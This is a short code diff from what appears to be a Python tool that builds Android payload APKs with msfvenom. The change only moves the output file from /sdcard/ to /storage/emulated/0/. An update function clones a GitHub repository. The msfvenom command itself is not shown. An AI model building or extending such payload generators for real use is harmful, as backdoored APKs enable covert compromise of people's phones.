@@ -14,7 +14,7 @@ def build_payload():
 
     os.system(msfvenom_command)
 
-    os.system(f"mv {apk_name}.apk /sdcard/")
+    os.system(f"mv {apk_name}.apk /storage/emulated/0/")
 
 def update():
     os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
